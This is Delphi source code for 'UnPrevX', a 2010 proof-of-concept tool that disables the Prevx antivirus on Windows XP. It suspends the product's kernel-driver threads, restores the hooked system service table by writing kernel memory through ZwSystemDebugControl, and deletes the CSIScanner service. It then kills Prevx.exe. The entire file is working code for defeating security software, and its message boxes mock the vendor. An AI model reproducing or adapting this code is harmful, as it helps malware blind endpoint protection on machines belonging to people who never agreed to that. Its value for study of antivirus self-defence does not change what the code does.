//{$DEFINE minimum}
{$E exe}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}

{$IFDEF minimum}
program UnPrevx;
{$ENDIF}
{$IFNDEF minimum}
unit UnPrevx;
interface
implementation
{$ENDIF}

{$R version.res}

uses
  Windows, RTL, WinNative, LDASM, Loader;

const
  Title: PWideChar = 'UnPrevX 1.0.189 (17.08.2010)';
  ProcessesMaxID = 1;
  TargetProcesses: array[0..ProcessesMaxID] of PWideChar = ('Prevx.exe', '');

type
  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  ProcessHandles: array[0..31] of THANDLE;
  ProcessesID: array[0..ProcessesMaxID] of DWORD;
  ProcessHandlesCount: integer = 0;
  PointerToSDT: pointer = nil;
  TableBuffer: PVOID = nil;
  SnapShotHandle: THANDLE;
  pBuffer: PROCESSENTRY32W;
  tmp2: LBuf;


type
  _SERVICE_DESCRIPTOR_ENTRY = record
    ServiceTableBase: PPVOID;
    ServiceCounterTableBase: PPVOID; //Used only in checked build
    NumberOfServices: DWORD;
    ParamTableBase: PBYTE;
  end;
  SERVICE_DESCRIPTOR_ENTRY = _SERVICE_DESCRIPTOR_ENTRY;
  PSERVICE_DESCRIPTOR_ENTRY = ^_SERVICE_DESCRIPTOR_ENTRY;

const
  WINXP_SDT_ENTRIES_COUNT = 284;

var
  KernelSize: DWORD;
  KernelBase, pOriginalSDT: PVOID;
  AppTerminated: boolean = false;

procedure DisableCSIEngine(); //stop and disable CSI
var
  hscm, hsrv: SC_HANDLE;
begin
  hscm := OpenSCManagerW(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (hscm <> 0) then
  begin
    strcpyW(tmp2, 'CSIScanner');
    hsrv := OpenServiceW(hscm, tmp2, SERVICE_ALL_ACCESS);
    if (hsrv <> 0) then
    begin
      DeleteService(hsrv);
      CloseServiceHandle(hsrv);
    end;
    CloseServiceHandle(hscm);
  end;
end;

function FindOrigSDT(const pKernel: pointer; kernelBase: DWORD): DWORD;
var
  t: DWORD;
  p1: PChar;
begin
  result := 0;
  t := DWORD(FastGetProcAddress(HINST(pKernel), 'KeServiceDescriptorTable')) - DWORD(pKernel);
  p1 := pKernel;
  repeat
    if ((PWORD(p1)^ = $05C7) and (PDWORD(p1 + 2)^ = t + kernelBase)) then
    begin
      result := PDWORD(p1 + 6)^ - kernelBase;
      break;
    end;
    inc(p1);
  until false;
end;

function GetKeServiceDescriptorTable(fPtr: PChar): PVOID;
var
  c: DWORD;
begin
  for c := 0 to 4095 do
    if (PWORD(fPtr + c)^ = $888D) then
    begin
      result := PPVOID(fPtr + c + 2)^;
      exit;
    end;
  result := nil;
end;

function UnhookSSDT(param: PVOID): PVOID; stdcall;
var
  rv: MEMORY_CHUNKS;
  bytesIO: ULONG;
begin
  if (param = nil) then //loop
  begin
    SetThreadPriority(DWORD(-2), THREAD_PRIORITY_TIME_CRITICAL);
    while true and not AppTerminated do
    begin
      rv.Address := PSERVICE_DESCRIPTOR_ENTRY(TableBuffer)^.ServiceTableBase;
      rv.Data := pOriginalSDT;
      rv.Length := WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD);
      ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
      NtSleep(500);
    end;
  end
  else
  begin
    rv.Address := PSERVICE_DESCRIPTOR_ENTRY(TableBuffer)^.ServiceTableBase;
    rv.Data := pOriginalSDT;
    rv.Length := WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD);
    ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
  end;
  result := nil;
end;

procedure GetOriginalSystemState();
var
  pntkernel, psdt: PVOID;
  modinf: SYSINFO_BUFFER;
  bytesIO: ULONG;
  rv: MEMORY_CHUNKS;
  textbuf: array[0..MAX_PATH - 1] of WideChar;
begin
  bytesIO := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @modinf, sizeof(SYSINFO_BUFFER), @bytesIO);
  if (bytesIO = 0) then exit;
  strcpyW(textbuf, '\??\');
  strcatW(textbuf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(textbuf, '\system32\');
  RtlAnsiToUnicode(strendW(textbuf), @modinf.ModInfo[0].ImageName[modinf.ModInfo[0].ModuleNameOffset]);
  KernelBase := modinf.ModInfo[0].Base;
  pntkernel := PELdrLoadLibrary3(textbuf, nil, modinf.ModInfo[0].Base);
  if (pntkernel <> nil) then
  begin
    KernelSize := PEGetVirtualSize(pntkernel);

    TableBuffer := mmalloc(align(KernelSize, PAGE_SIZE), TRUE);
    if (TableBuffer <> nil) then
    begin
      psdt := PChar(pntkernel) + FindOrigSDT(pntkernel, DWORD(modinf.ModInfo[0].Base));
      pOriginalSDT := mmalloc(WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD));
      if (pOriginalSDT <> nil) then
        memcopy(pOriginalSDT, psdt, WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD));

      rv.Address := KernelBase;
      rv.Data := TableBuffer;
      rv.Length := KernelSize;
      ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);

      PointerToSDT := PChar(FastGetProcAddress(HINST(TableBuffer), 'KeAddSystemServiceTable'))
        - DWORD(TableBuffer) + DWORD(KernelBase);

      rv.Address := PointerToSDT;
      rv.Data := TableBuffer;
      rv.Length := 4096;
      ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);

      PointerToSDT := GetKeServiceDescriptorTable(TableBuffer);
      rv.Address := PointerToSDT;
      rv.Data := TableBuffer;
      rv.Length := 4096;
      ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);

      ZwClose(CreateThread(nil, 0, @UnhookSSDT, nil, 0, bytesIO));

      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pntkernel, @bytesIO, MEM_RELEASE);
    end;
  end;
end;

var
  cid: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;

procedure FindAndDisablePrevxDriver();
var
  hThread: THANDLE;
  i, u: integer;
  Modules: PSystemModules;
  bytesIO, tadr1: DWORD;
  PrevxStart, PrevxEnd: DWORD;
  membuf: PChar;
  pp1: PSYSTEM_PROCESSES;
  pt1: PSYSTEM_THREADS;
begin
  bytesIO := 0;
  i := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @i, sizeof(DWORD), @bytesIO);

  PrevxStart := 0;
  PrevxEnd := 0;

  Modules := nil;
  ZwAllocateVirtualMemory(NtCurrentProcess, @Modules, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (Modules <> nil) then
  begin
    ZwQuerySystemInformation(SystemModuleInformation, Modules, bytesIO, @bytesIO);
    for u := 0 to Integer(Modules^.Count) - 1 do
    begin
      if (strcmpiA(@Modules^.sysmodules[u].ImageName[Modules^.sysmodules[u].ModuleNameOffset], 'pxrts.sys') = 0) then
      begin
        PrevxStart := ULONG(Modules^.sysmodules[u].Base);
        PrevxEnd := ULONG(Modules^.sysmodules[u].Base) + Modules^.sysmodules[u].Size;
        break;
      end;
    end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @Modules, @bytesIO, MEM_RELEASE);
  end;

  if (PrevxStart = 0) or (PrevxEnd = 0) then exit;

  membuf := mmalloc((1024 * 1024) * 4, true);
  if (membuf <> nil) then
  begin

    if (ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, membuf, bytesIO, @bytesIO) = STATUS_SUCCESS) then
    begin
      pp1 := PSYSTEM_PROCESSES(membuf);
      while (1 = 1) do
      begin
        if (pp1^.ProcessId = 4) then
        begin

          pt1 := PSYSTEM_THREADS(@pp1^.Threads);
          i := 0;
          u := pp1.ThreadCount;

          while (i < u) do
          begin
            tadr1 := ULONG(pt1^.StartAddress);
            if ((tadr1 >= PrevxStart) and (tadr1 <= PrevxEnd)) then
            begin
              InitializeObjectAttributes(@attr, nil, 0, 0);
              cid.UniqueProcess := pp1^.ProcessId;
              cid.UniqueThread := pt1^.ClientId.UniqueThread;
              if (ZwOpenThread(@hThread, THREAD_ALL_ACCESS, @attr, @cid) = STATUS_SUCCESS) then
              begin
                ZwSuspendThread(hThread, @bytesIO);
                ZwClose(hThread);
              end;

            end;
            inc(i);
            pt1 := PSYSTEM_THREADS(PChar(pt1) + sizeof(_SYSTEM_THREADS));
          end;


        end;

        if (pp1^.NextEntryOffset = 0) then break;
          pp1 := PSYSTEM_PROCESSES(PChar(pp1) + pp1^.NextEntryOffset);
      end;
    end;
    mmfree(membuf);
  end;

end;

procedure TerminateProcesses();
var
  i: integer;
  hProcess: THANDLE;
  cid1: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;
begin
  ProcessHandlesCount := 0;
  memzero(@ProcessesID, sizeof(ProcessesID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    SetThreadPriority(DWORD(-2), THREAD_PRIORITY_TIME_CRITICAL);
    InitializeObjectAttributes(@attr, nil, 0, 0);
    cid1.UniqueThread := 0;
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        for i := 0 to ProcessesMaxID - 1 do
        begin
          if (strcmpiW(pBuffer.szExeFile, TargetProcesses[i]) = 0) then
          begin
            hProcess := 0;
            cid1.UniqueProcess := pBuffer.th32ProcessID;
            UnhookSSDT(pointer($100));
            DisableCSIEngine();
            if (ZwOpenProcess(@hProcess, PROCESS_TERMINATE, @attr, @cid1) = STATUS_SUCCESS) then
            begin
              UnhookSSDT(pointer($100));
              ZwTerminateProcess(hProcess, 0);
              ZwClose(hProcess);
            end;
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;

  MessageBoxW(0, 'That''s all folks, keep hooking =))', Title, MB_OK);
end;

function TargetIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\pxrts');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

var
  prev: integer;
  osver: OSVERSIONINFOEXW;
begin
  if (MessageBoxW(GetDesktopWindow(), 'User mode proof-of-concept Prevx 3.0 kill'#13#10 +
    'Fucking handles/SSDT/Shadow SSDT will not help Prevx!'#13#13#10 +
    'Yes to continue, No to exit program'#13#10 +
    '(c) 2010 by EP_X0FF', Title, MB_YESNO) = IDNO) then exit;


  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then
  begin
    MessageBoxW(0, 'Unsupported OS <Anai_iiooe>', nil, MB_OK);
  end;
  SetPriorityClass(DWORD(-1), REALTIME_PRIORITY_CLASS);
  if (RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, @prev) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(0, 'Cannot get more privilegies', Title, MB_OK);
    ExitProcess(0);
  end;
  if (TargetIsRunning()) then
  begin
    AppTerminated := false;
    MessageBoxW(GetDesktopWindow(), 'Prevx located, let''s do some fun with it', Title, MB_ICONINFORMATION);
    FindAndDisablePrevxDriver();
    GetOriginalSystemState();
    TerminateProcesses();
  end else MessageBoxW(0, 'Prevx not found, start it first =)', Title, MB_OK);
  AppTerminated := true;
  if (pOriginalSDT <> nil) then mmfree(pOriginalSDT);
  if (TableBuffer <> nil) then mmfree(TableBuffer);
end.

